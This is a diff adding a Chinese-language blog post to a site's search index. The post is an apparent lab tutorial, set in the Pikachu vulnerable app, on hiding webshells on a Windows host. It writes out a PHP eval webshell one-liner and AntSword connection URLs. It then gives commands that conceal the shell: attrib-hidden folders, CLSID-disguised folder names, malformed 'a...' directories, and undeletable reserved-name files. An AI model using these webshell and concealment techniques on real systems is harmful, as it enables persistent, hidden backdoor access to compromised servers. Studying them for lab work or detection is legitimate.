@@ -15661,4 +15661,45 @@ systemctl status apache2.service
 <p><img src="/2022/01/03/pikachu/pikachu-yuan-cheng-wen-jian-bao-han-xie-ru-mu-ma/e.png" alt="e"></p>
 ]]></content>
   </entry>
+  <entry>
+    <title>Windows主机下隐藏木马</title>
+    <url>/2022/01/03/windows-zhu-ji-xia-yin-cang-mu-ma/windows-zhu-ji-xia-yin-cang-mu-ma/</url>
+    <content><![CDATA[<p>接上文（<a href="https://lxh3ng.github.io/2022/01/03/pikachu/pikachu-yuan-cheng-wen-jian-bao-han-xie-ru-mu-ma/">Pikachu：远程文件包含写入木马</a>）在目录下创建了shell.php后</p>
+<h2 id="隐藏文件夹隐藏Webshell"><a href="#隐藏文件夹隐藏Webshell" class="headerlink" title="隐藏文件夹隐藏Webshell"></a>隐藏文件夹隐藏Webshell</h2><p>打开蚁剑终端</p>
+<pre class=" language-shell"><code class="language-shell">mkdir tmp #创建隐藏文件夹,此时尚未隐藏
+cd tmp #进入创建的文件夹
+echo ^<?php @eval($_POST["shell"]);?^> >>shell.php#写入Webshell至tmp目录下
+cd ../ #返回上一级目录
+attrib +s +a +h +r tmp #对创建的文件夹进行隐藏</code></pre>
+<p><img src="/2022/01/03/windows-zhu-ji-xia-yin-cang-mu-ma/windows-zhu-ji-xia-yin-cang-mu-ma/1.png" alt="img"></p>
+<p>我打开了显示隐藏文件，还是看不到的</p>
+<p><img src="/2022/01/03/windows-zhu-ji-xia-yin-cang-mu-ma/windows-zhu-ji-xia-yin-cang-mu-ma/2.png" alt="2"></p>
+<p>新的路径蚁剑可以连接：</p>
+<p><img src="/2022/01/03/windows-zhu-ji-xia-yin-cang-mu-ma/windows-zhu-ji-xia-yin-cang-mu-ma/3.png" alt="3"></p>
+<p>win11打开显示隐藏查看不到，但是可以通过路径直接访问</p>
+<h2 id="利用系统代号隐藏Webshell"><a href="#利用系统代号隐藏Webshell" class="headerlink" title="利用系统代号隐藏Webshell"></a>利用系统代号隐藏Webshell</h2><p>特殊文件名的代号</p>
+<pre class=" language-windows"><code class="language-windows">我的电脑.{20D04FE0-3AEA-1069-A2D8-08002B30309D}
+回收站.{645ff040-5081-101b-9f08-00aa002f954e}
+拔号网络.{992CFFA0-F557-101A-88EC-00DD010CCC48}
+打印机.{2227a280-3aea-1069-a2de-08002b30309d}
+控制面板.{21ec2020-3aea-1069-a2dd-08002b30309d}
+网上邻居.{208D2C60-3AEA-1069-A2D7-08002B30309D}</code></pre>
+<p>新建文件夹命名<code>我的电脑.{20D04FE0-3AEA-1069-A2D8-08002B30309D}</code>会变成我的电脑</p>
+<p><img src="/2022/01/03/windows-zhu-ji-xia-yin-cang-mu-ma/windows-zhu-ji-xia-yin-cang-mu-ma/4.png" alt="4"></p>
+<p>通过拼接文件夹名,使用中国蚁剑进行木马连接,例如</p>
+<pre class=" language-http"><code class="language-http"><span class="token header-name keyword">http:</span>//。。。。。。。/Computer.{20D04FE0-3AEA-1069-A2D8-08002B30309D}/shell.php</code></pre>
+<p><img src="/2022/01/03/windows-zhu-ji-xia-yin-cang-mu-ma/windows-zhu-ji-xia-yin-cang-mu-ma/5.png" alt="5"></p>
+<h2 id="畸形目录隐藏Webshell"><a href="#畸形目录隐藏Webshell" class="headerlink" title="畸形目录隐藏Webshell"></a>畸形目录隐藏Webshell</h2><p>创建畸形目录</p>
+<pre class=" language-shell"><code class="language-shell">mkdir a...\</code></pre>
+<p>Copy命令将木马移动到畸形目录下</p>
+<pre class=" language-shell"><code class="language-shell">copy b.asp</code></pre>
+<p>删除方法：</p>
+<pre class=" language-shell"><code class="language-shell">rd /s /q a...\</code></pre>
+<p><img src="/2022/01/03/windows-zhu-ji-xia-yin-cang-mu-ma/windows-zhu-ji-xia-yin-cang-mu-ma/6.png" alt="6"></p>
+<h2 id="利用系统保留名制作不死Webshell"><a href="#利用系统保留名制作不死Webshell" class="headerlink" title="利用系统保留名制作不死Webshell"></a>利用系统保留名制作不死Webshell</h2><p>在Windows操作系统中,是不能以下形式创建文件的,比如aux,com1,com2,prn,con,nul等.但是在cmd目录下可以通过copy语句创建,这类文件无法在图形化界面被删除,只能在命令行中被删除. 创建不死Webshell命令如下:</p>
+<pre class=" language-shell"><code class="language-shell">copy shell.php \\.\D:\phpStudy\PHPTutorial\WWW\pikachu\vul\fileinclude\1.php</code></pre>
+<p>我的win11没有复现成功</p>
+<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg3ODY3MzcwMQ==&amp;mid=2247484784&amp;idx=3&amp;sn=8fc983d40d91b7a9a7eb709e65c944cd&amp;chksm=cf116f3af866e62c90285b409378aabfc55d708ea0606b9c81630e52cb1ca4c059027849907d&amp;mpshare=1&amp;scene=23&amp;srcid=0103GMx84FrUrfZnWKJpp0Jl&amp;sharer_sharetime=1641200593711&amp;sharer_shareid=992c19d88a5a27647ec75d14d60782cb#rd">Th0r：Windows下木马隐藏小技巧</a></p>
+]]></content>
+  </entry>
 </search>
